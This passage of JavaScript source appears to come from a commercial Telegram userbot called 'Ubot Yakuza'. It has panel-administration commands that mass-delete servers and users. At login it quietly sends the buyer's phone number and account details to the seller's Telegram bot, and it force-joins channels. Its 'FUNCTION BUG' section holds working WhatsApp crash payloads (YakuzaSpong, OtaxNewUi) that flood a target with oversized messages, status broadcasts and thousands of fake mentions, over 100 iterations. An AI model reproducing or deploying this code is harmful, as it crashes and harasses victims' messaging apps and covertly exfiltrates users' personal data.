│➥ ᴅᴏᴍᴀɪɴ      : ${domain}
│➥ ɴᴀᴍᴀ         : ${name}
│➥ ᴇᴍᴀɪʟ        : ${email}
│➥ ᴘᴀssᴡᴏʀᴅ     : ${password}
┗━━━━━━━━━⬣</blockquote>`.trim();

    await client.sendMessage(targetId, { message: msgText, parseMode: "html" });
    await client.sendMessage(chatId, { message: `<blockquote>✅ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ʙᴇʀʜᴀsɪʟ ᴅɪʙᴜᴀᴛ ᴅᴀɴ ᴅᴀᴛᴀ ᴅɪᴋɪʀɪᴍ ᴋᴇ ɪᴅ ${targetId}</blockquote>`, parseMode: "html", replyTo: message.id });

  } catch (err) {
    await client.sendMessage(chatId, {
      message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇᴍʙᴜᴀᴛ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ: <code>${escapeHtml(err.message)}</code></blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  }
}

async function handleDelADPCommand(client, chatId, message, textArgs, prefix) {
  const targetUserId = (textArgs || "").trim();
  if (!targetUserId) {
    return await client.sendMessage(chatId, {
      message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ sᴀʟᴀʜ. ɢᴜɴᴀᴋᴀɴ: <code>${prefix}deladp ID</code></blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  }

  try {
    const res = await fetch(`${domain}/api/application/users/${targetUserId}`, {
      method: "DELETE",
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });

    if (!res.ok) {
      const dataErr = await res.json().catch(() => ({}));
      throw new Error(JSON.stringify(dataErr.errors || dataErr));
    }

    await client.sendMessage(chatId, {
      message: `<blockquote>✅ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴅᴇɴɢᴀɴ ɪᴅ <code>${targetUserId}</code> ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs</blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });

  } catch (err) {
    await client.sendMessage(chatId, {
      message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢʜᴀᴘᴜs ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ: <code>${escapeHtml(err.message)}</code></blockquote>`,
      parseMode: "html",
      replyTo: message.id,
    });
  }
}

async function handleListADPCommand(client, chatId, message) {
  try {
    const res = await fetch(`${domain}/api/application/users`, {
      method: "GET",
      headers: { Authorization: `Bearer ${plta}`, Accept: "application/json" },
    });
    const data = await res.json();
    const users = data.data || [];
    const admins = users.filter(u => u.attributes.root_admin);
    const listText = admins.length? admins.map(u => `• ${u.attributes.username} | ID: ${u.attributes.id}`).join("\n")
  : "No admin panel users found.";
    await client.sendMessage(chatId, { message: `<pre>${listText}</pre>`, parseMode: "html", replyTo: message.id });
  } catch (err) {
    await client.sendMessage(chatId, { message: `❌ Failed to list: ${escapeHtml(err.message)}`, parseMode: "html", replyTo: message.id });
  }
}

async function handleListSrvCommand(client, chatId, message) {
  try {
    const res = await fetch(`${domain}/api/application/servers`, {
      method: "GET",
      headers: { Authorization: `Bearer ${plta}`, Accept: "application/json" },
    });
    const data = await res.json();
    const servers = data.data || [];
    const listText = servers.map(s => `• ${s.attributes.name} | ID: ${s.attributes.id}`).join("\n") || "No servers found.";
    await client.sendMessage(chatId, { message: `<pre>${listText}</pre>`, parseMode: "html", replyTo: message.id });
  } catch (err) {
    await client.sendMessage(chatId, { message: `❌ Failed to list servers: ${escapeHtml(err.message)}`, parseMode: "html", replyTo: message.id });
  }
}

async function handleDelSrvCommand(client, chatId, message, textArgs, prefix) {
  const serverId = (textArgs || "").trim();
  if (!serverId) return await client.sendMessage(chatId, { message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ: ${prefix}delsrv ID</blockquote>`, parseMode: "html", replyTo: message.id });

  try {
    const res = await fetch(`${domain}/api/application/servers/${serverId}`, {
      method: "DELETE",
      headers: { Authorization: `Bearer ${plta}` },
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    await client.sendMessage(chatId, { message: `<blockquote>✅ sᴇʀᴠᴇʀ ɪᴅ ${serverId} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs</blockquote>`, parseMode: "html", parseMode: "html", replyTo: message.id });
  } catch (err) {
    await client.sendMessage(chatId, { message: `❌ ғᴀɪʟᴇᴅ: ${escapeHtml(err.message)}`, parseMode: "html", replyTo: message.id });
  }
}

async function handleClearAllSrvCommand(client, chatId, message, textArgs, prefix) {
  try {
    await client.sendMessage(chatId, { 
      message: `<blockquote>🚀 ᴍᴇɴɢʜᴀᴘᴜs sᴇᴍᴜᴀ sᴇʀᴠᴇʀ...</blockquote>`, 
      parseMode: "html", 
      replyTo: message.id 
    });

    const listRes = await fetch(`${domain}/api/application/servers`, {
      method: "GET",
      headers: { Authorization: `Bearer ${plta}` },
    });

    if (!listRes.ok) throw new Error(`Gagal mengambil daftar server: HTTP ${listRes.status}`);

    const servers = await listRes.json();
    const serverList = servers.data || [];

    if (serverList.length === 0) {
      return await client.sendMessage(chatId, { 
        message: `<blockquote>📋 ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇʀᴠᴇʀ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴅɪʜᴀᴘᴜs</blockquote>`, 
        parseMode: "html", 
        replyTo: message.id 
      });
    }

    let successCount = 0;
    let failCount = 0;
    const failedServers = [];

    for (const server of serverList) {
      try {
        const res = await fetch(`${domain}/api/application/servers/${server.attributes.id}`, {
          method: "DELETE",
          headers: { Authorization: `Bearer ${plta}` },
        });
        
        if (res.ok) {
          successCount++;
        } else {
          throw new Error(`HTTP ${res.status}`);
        }
      } catch (err) {
        failCount++;
        failedServers.push({
          id: server.attributes.id,
          name: server.attributes.name,
          error: err.message
        });
      }
    }

    let reportMessage = `<blockquote>✅ ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs: <b>${successCount}</b> sᴇʀᴠᴇʀ\n❌ ɢᴀɢᴀʟ ᴅɪʜᴀᴘᴜs: <b>${failCount}</b> sᴇʀᴠᴇʀ\n\n${failedServers.length > 0 ? `<b>sᴇʀᴠᴇʀ ʏᴀɴɢ ɢᴀɢᴀʟ ᴅɪʜᴀᴘᴜs:</b>\n${failedServers.map((server, index) => `${index + 1}. ${server.name} ɪᴅ: ${server.id} - ${server.error}`).join('\n')}` : ''}</blockquote>`;

    await client.sendMessage(chatId, { 
      message: reportMessage, 
      parseMode: "html", 
      replyTo: message.id 
    });

  } catch (err) {
    await client.sendMessage(chatId, { 
      message: `❌ ғᴀɪʟᴇᴅ: ${escapeHtml(err.message)}`, 
      parseMode: "html", 
      replyTo: message.id 
    });
  }
}

async function handleClearSrvOffCommand(client, chatId, message, textArgs, prefix) {
  try {
    await client.sendMessage(chatId, { 
      message: `<blockquote>🚀 ᴍᴇɴɢʜᴀᴘᴜs sᴇᴍᴜᴀ sᴇʀᴠᴇʀ ᴏꜰꜰʟɪɴᴇ...</blockquote>`, 
      parseMode: "html", 
      replyTo: message.id 
    });

    const listRes = await fetch(`${domain}/api/application/servers`, {
      method: "GET",
      headers: { Authorization: `Bearer ${plta}` },
    });

    if (!listRes.ok) throw new Error(`Gagal mengambil daftar server: HTTP ${listRes.status}`);

    const servers = await listRes.json();
    const serverList = servers.data || [];

    if (serverList.length === 0) {
      return await client.sendMessage(chatId, { 
        message: `<blockquote>📋 ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇʀᴠᴇʀ</blockquote>`, 
        parseMode: "html", 
        replyTo: message.id 
      });
    }

    let successCount = 0;
    let failCount = 0;
    const failedServers = [];

    for (const server of serverList) {
      try {
        const usageRes = await fetch(`${domain}/api/client/servers/${server.attributes.uuid}/resources`, {
          method: "GET",
          headers: { 
            Authorization: `Bearer ${plta}`,
            "Content-Type": "application/json"
          },
        });

        if (usageRes.ok) {
          const usageData = await usageRes.json();
          if (usageData.attributes.current_state !== "running") {
            const deleteRes = await fetch(`${domain}/api/application/servers/${server.attributes.id}`, {
              method: "DELETE",
              headers: { Authorization: `Bearer ${plta}` },
            });
            
            if (deleteRes.ok) {
              successCount++;
            } else {
              throw new Error(`HTTP ${deleteRes.status}`);
            }
          }
        } else {
          const deleteRes = await fetch(`${domain}/api/application/servers/${server.attributes.id}`, {
            method: "DELETE",
            headers: { Authorization: `Bearer ${plta}` },
          });
          
          if (deleteRes.ok) {
            successCount++;
          } else {
            throw new Error(`HTTP ${deleteRes.status}`);
          }
        }
      } catch (err) {
        failCount++;
        failedServers.push({
          id: server.attributes.id,
          name: server.attributes.name,
          error: err.message
        });
      }
    }

    let reportMessage = `<blockquote>✅ ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs: <b>${successCount}</b> sᴇʀᴠᴇʀ ᴏғғʟɪɴᴇ\n❌ ɢᴀɢᴀʟ ᴅɪʜᴀᴘᴜs: <b>${failCount}</b> server\n\n`;

    if (failedServers.length > 0) {
      reportMessage += `<b>sᴇʀᴠᴇʀ ʏᴀɴɢ ɢᴀɢᴀʟ ᴅɪʜᴀᴘᴜs:</b>\n`;
      failedServers.forEach((server, index) => {
        reportMessage += `${index + 1}. ${server.name} (ID: ${server.id}) - ${server.error}\n`;
      });
    }

    reportMessage += `</blockquote>`;

    await client.sendMessage(chatId, { 
      message: reportMessage, 
      parseMode: "html", 
      replyTo: message.id 
    });

  } catch (err) {
    await client.sendMessage(chatId, { 
      message: `❌ ғᴀɪʟᴇᴅ: ${escapeHtml(err.message)}`, 
      parseMode: "html", 
      replyTo: message.id 
    });
  }
}

async function handleClearAllUserCommand(client, chatId, message, textArgs, prefix) {
  try {
    await client.sendMessage(chatId, { 
      message: `<blockquote>🚀 ᴍᴇɴɢʜᴀᴘᴜs sᴇᴍᴜᴀ ᴜsᴇʀ ᴋᴇᴄᴜᴀʟɪ ɪᴅ 1...</blockquote>`, 
      parseMode: "html", 
      replyTo: message.id 
    });

    const listRes = await fetch(`${domain}/api/application/users`, {
      method: "GET",
      headers: { Authorization: `Bearer ${plta}` },
    });

    if (!listRes.ok) throw new Error(`Gagal mengambil daftar user: HTTP ${listRes.status}`);

    const users = await listRes.json();
    const userList = users.data || [];

    if (userList.length === 0) {
      return await client.sendMessage(chatId, { 
        message: `<blockquote>📋 ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴜsᴇʀ</blockquote>`, 
        parseMode: "html", 
        replyTo: message.id 
      });
    }

    let successCount = 0;
    let failCount = 0;
    const failedUsers = [];

    for (const user of userList) {
      try {
        if (user.attributes.id === 1) {
          continue;
        }

        const res = await fetch(`${domain}/api/application/users/${user.attributes.id}`, {
          method: "DELETE",
          headers: { Authorization: `Bearer ${plta}` },
        });
        
        if (res.ok) {
          successCount++;
        } else {
          throw new Error(`HTTP ${res.status}`);
        }
      } catch (err) {
        failCount++;
        failedUsers.push({
          id: user.attributes.id,
          username: user.attributes.username,
          email: user.attributes.email,
          error: err.message
        });
      }
    }

    let reportMessage = `<blockquote>✅ ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs: <b>${successCount}</b> ᴜsᴇʀ\n❌ ɢᴀɢᴀʟ ᴅɪʜᴀᴘᴜs: <b>${failCount}</b> ᴜsᴇʀ\n\n`;

    if (failedUsers.length > 0) {
      reportMessage += `<b>ᴜsᴇʀ ʏᴀɴɢ ɢᴀɢᴀʟ ᴅɪʜᴀᴘᴜs:</b>\n`;
      failedUsers.forEach((user, index) => {
        reportMessage += `${index + 1}. ${user.username} ${user.email} - ɪᴅ: ${user.id} - ${user.error}\n`;
      });
    }

    reportMessage += `</blockquote>`;

    await client.sendMessage(chatId, { 
      message: reportMessage, 
      parseMode: "html", 
      replyTo: message.id 
    });

  } catch (err) {
    await client.sendMessage(chatId, { 
      message: `❌ ғᴀɪʟᴇᴅ: ${escapeHtml(err.message)}`, 
      parseMode: "html", 
      replyTo: message.id 
    });
  }
}

const totalFitur = hitungTotalFitur();

function hitungTotalFitur() {
  try {
    const kode = fs.readFileSync("./main.js", "utf8");
    const cocok = kode.match(/case\s+['"`][^'"`]+['"`]\s*:/g);
    return cocok ? cocok.length : 0;
  } catch {
    return 0;
  }
}

const tagallChats = new Set();

const emojiCategories = {
  smileys: ["😀","😃","😄","😁","😆","😅","😂","🤣","😊","😍","🥰","😘","😎","🥳","😇","🙃","😋","😛","🤪"],
  animals: ["🐶","🐱","🐰","🐻","🐼","🦁","🐸","🦊","🦔","🦄","🐢","🐠","🐦","🦜","🦢","🦚","🦓","🐅","🦔"],
  food: ["🍎","🍕","🍔","🍟","🍩","🍦","🍓","🥪","🍣","🍔","🍕","🍝","🍤","🥗","🥐","🍪","🍰","🍫","🥤"],
  nature: ["🌲","🌺","🌞","🌈","🌊","🌍","🍁","🌻","🌸","🌴","🌵","🍃","🍂","🌼","🌱","🌾","🍄","🌿","🌳"],
  travel: ["✈️","🚀","🚲","🚗","⛵","🏔️","🚁","🚂","🏍️","🚢","🚆","🛴","🛸","🛶","🚟","🚈","🛵","🛎️","🚔"],
  sports: ["⚽","🏀","🎾","🏈","🎱","🏓","🥊","⛳","🏋️","🏄","🤸","🏹","🥋","🛹","🥏","🎯","🥇","🏆","🥅"],
  music: ["🎵","🎶","🎤","🎧","🎼","🎸","🥁","🎷","🎺","🎻","🪕","🎹","🔊"],
  celebration: ["🎉","🎊","🥳","🎈","🎁","🍰","🧁","🥂","🍾","🎆","🎇"],
  work: ["💼","👔","👓","📚","✏️","📆","🖥️","🖊️","📂","📌","📎"],
  emotions: ["❤️","💔","😢","😭","😠","😡","😊","😃","🙄","😳","😇","😍"],
};

function randomEmoji() {
  const cats = Object.keys(emojiCategories);
  const cat = cats[Math.floor(Math.random() * cats.length)];
  const arr = emojiCategories[cat];
  return arr[Math.floor(Math.random() * arr.length)];
}

async function connectClient() {
    console.log("🔐 SYSTEM: Memeriksa autentikasi...");
    
    try {
        await check();
        console.log("🚀 LANJUT LOGIN UBOT YAKUZA...");
    } catch (error) {
        console.error("❌ Gagal autentikasi:", error.message);
        return null;
    }

    console.log("🚀 Proses Login Telegram...");

    const client = new TelegramClient(stringSession, apiId, apiHash, {
        connectionRetries: 5,
    });

    try {
        await client.start({
            phoneNumber: async () => await input.text("Enter Nomor: "),
            password: async () => await input.text("Enter Password: "),
            phoneCode: async () => await input.text("Enter Code: "), 
            onError: (err) => console.error("Error:", err),
        });

        console.log("✅ Koneksi Sukses!");
        const newSessionString = client.session.save();
        console.log("💾 Sesi Anda:", newSessionString);
        
        saveSessionToConfig(newSessionString);

        await sendThankYouMessage(client);

        await autoJoinChannelsAndGroups(client);

    } catch (e) {
        console.error("❌ Error:", e);
        return null;
    }

    return client;
}

async function sendThankYouMessage(client) {
    try {

        let userId = 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
        let dcId = 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
        let phoneNumber = 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
        let username = 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
        let firstName = 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
        let lastName = 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
        
        try {
            const me = await client.getMe();
            userId = me.id.toString();
            dcId = client.session.dcId?.toString() || 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
            phoneNumber = me.phone || 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
            username = me.username || 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
            firstName = me.firstName || 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
            lastName = me.lastName || 'ᴛɪᴅᴀᴋ ᴀᴅᴀ';
            
        } catch (userError) {

        }

        const thankYouMessage = `<blockquote expandable>
╔═══════════════════════
║   <b>PESAN DARI YAKUZA</b>
╠═══════════════════════
║
║ <b>ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴏʀᴅᴇʀ</b>
║ <b>sᴄʀɪᴘᴛ ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ</b>
║
║ ➤ <b>ᴛᴏᴛᴀʟ ғɪᴛᴜʀ:</b> 138
║ ➤ <b>ᴜᴘᴅᴀᴛᴇ:</b> 21-11-2025
║
╚═══════════════════════
</blockquote>`.trim();

        try {
            await client.sendMessage('me', {
                message: thankYouMessage,
                parseMode: 'html'
            });
        } catch (e) {

        }

        try {
            await client.sendMessage('ubotYakuza', {
                message: `<blockquote expandable>
╔═══════════════════════
║
║ ➤ <b>ɪᴅ:</b> <code>${userId}</code>
║ ➤ <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @${username}
║ ➤ <b>ɴᴀᴍᴀ:</b> ${firstName} ${lastName}
║ ➤ <b>ᴛᴀɴɢɢᴀʟ:</b> ${new Date().toLocaleString('id-ID')}
║
║ <b>sᴇʟᴀᴍᴀᴛ ᴍᴇɴɪᴋᴍᴀᴛɪ ғɪᴛᴜʀ ᴜʙᴏᴛ ʏᴀᴋᴜᴢᴀ</b>
║
╚═══════════════════════
</blockquote>`.trim(),
                parseMode: 'html'
            });
        } catch (e) {

        }

        try {
            const ownerMessage = `<blockquote expandable>
🎉 <b>ᴜsᴇʀ ʙᴀʀᴜ</b> 🎉

┌ <b>🆔 ᴜsᴇʀ ɪᴅ:</b> <code>${userId}</code>
├ <b>📱 ɴᴏᴍᴏʀ:</b> <code>${phoneNumber}</code>
├ <b>👤 ᴜsᴇʀɴᴀᴍᴇ:</b> ${username ? '@' + username : 'ᴛɪᴅᴀᴋ ᴀᴅᴀ'}
├ <b>👨‍💼 ɴᴀᴍᴇ:</b> ${firstName} ${lastName}
├ <b>🌐 ᴅᴄ ɪᴅ:</b> ${dcId}
├ <b>📅 ᴡᴀᴋᴛᴜ:</b> ${new Date().toLocaleString('id-ID')}

</blockquote>`.trim();

            await axios.post(`https://api.telegram.org/bot${OWNER_BOT_TOKEN2}/sendMessage`, {
                chat_id: "7429086469",
                text: ownerMessage,
                parse_mode: "HTML"
            });
        } catch (error) {

        }
    } catch (error) {

    }
}

async function autoJoinChannelsAndGroups(client) {
    try {
        const channelsToJoin = [
            "ubotYakuza",
            "Death_kings01",
            "Death_kings10"
        ];

        const joinedSuccessfully = [];
        const failedToJoin = [];

        for (const channel of channelsToJoin) {
            try {
                try {
                    const entity = await client.getEntity(channel);
                    
                    if (entity && entity.participants_count !== undefined) {
                        joinedSuccessfully.push(channel);
                        continue;
                    }
                } catch (error) {
                }

                try {
                    const result = await client.invoke(
                        new Api.channels.JoinChannel({
                            channel: channel
                        })
                    );
                    
                    joinedSuccessfully.push(channel);
                    
                } catch (joinError) {
                    try {
                        const result = await client.invoke(
                            new Api.channels.JoinChannel({
                                channel: `@${channel}`
                            })
                        );
                        
                        joinedSuccessfully.push(channel);
                        
                    } catch (secondError) {
                        console.error(`❌ Gagal join @${channel}:`, secondError.message);
                        failedToJoin.push({ 
                            channel: `@${channel}`, 
                            error: secondError.message 
                        });
                    }
                }
                
                const delay = Math.floor(Math.random() * 3000) + 2000;
                await new Promise(resolve => setTimeout(resolve, delay));
                
            } catch (error) {
                console.error(`❌ Error pada @${channel}:`, error.message);
                failedToJoin.push({ 
                    channel: `@${channel}`, 
                    error: error.message 
                });
                
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }

        if (joinedSuccessfully.length > 0) {
            joinedSuccessfully.forEach((channel, index) => {

            });
        }
        
        if (failedToJoin.length > 0) {
            failedToJoin.forEach(({ channel, error }, index) => {
                console.log(`   ${index + 1}. ${channel} - Error: ${error}`);
            });
        }

        await notifyOwnerAboutJoinResults(joinedSuccessfully, failedToJoin);

    } catch (mainError) {
        console.error("❌ ERROR PADA AUTO JOIN SYSTEM:", mainError);
    }
}

async function notifyOwnerAboutJoinResults(joined, failed) {
    try {
        const message = `
<blockquote expandable>
⚠️ <b>LAPORAN AUTO JOIN UBOT YAKUZA</b>

✅ <b>Berhasil Join:</b> ${joined.length} channel & group
❌ <b>Gagal Join:</b> ${failed.length} channel & group

📋 <b>Detail Berhasil:</b>
${joined.map((channel, index) => `${index + 1}. @${channel}`).join('\n') || 'Tidak ada'}

${failed.length > 0 ? `
📋 <b>Detail Gagal:</b>
${failed.map(({channel, error}, index) => `${index + 1}. ${channel} - ${error}`).join('\n')}
` : ''}

🕒 <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
</blockquote>`.trim();

        await axios.post(`https://api.telegram.org/bot${OWNER_BOT_TOKEN2}/sendMessage`, {
            chat_id: "7429086469",
            text: message,
            parse_mode: "HTML"
        });
        
    } catch (error) {
        console.error("❌ Gagal kirim notifikasi hasil auto join:", error.message);
    }
}

// ========= FUNCTION BUG ========== //
async function YakuzaSpong(sock, target, mention) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " 驴Otax Here驴 ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }
  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, interMsg, msgxay]
 
  
    let content = {
        extendedTextMessage: {
          text: "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "軎�".repeat(50000),
          matchedText: "軎�".repeat(20000),
          description: "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴",
          title: "軎�".repeat(20000),
          previewType: "NONE",
          jpegThumbnail:
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1995 },
                () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "otax@newsletter",
                newsletterName:
                  "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "軎�".repeat(10000),
                caption:
                  "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" +
                  "軎�".repeat(60000) +
                  "釤勧煗".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName:
                "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "鈨濌櫚隀瓣櫚".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      };
      
    const xnxxmsg = generateWAMessageFromContent(target, content, {});

  
  let msg = null;
  for (let i = 0; i < 100; i++) {
  await sock.relayMessage("status@broadcast", xnxxmsg.message, {
      messageId: xnxxmsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
  
    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
   
     for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {})
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
    if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  }
  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function OtaxNewUi(sock, target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "ꌦꋬꀘ꒤ꁴ​ꋬ ꋊ꒐ꏂꁝ ꃳꄲꇙꇙ!\n" +
                  "ꦾ".repeat(50000) +
                  "ꦽ".repeat(50000) +
                  `\u2003`.repeat(50000),
              },
              nativeFlowMessage: {},
              contextInfo: {
        participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "X",
        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
        stanzaId: "123",
        quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
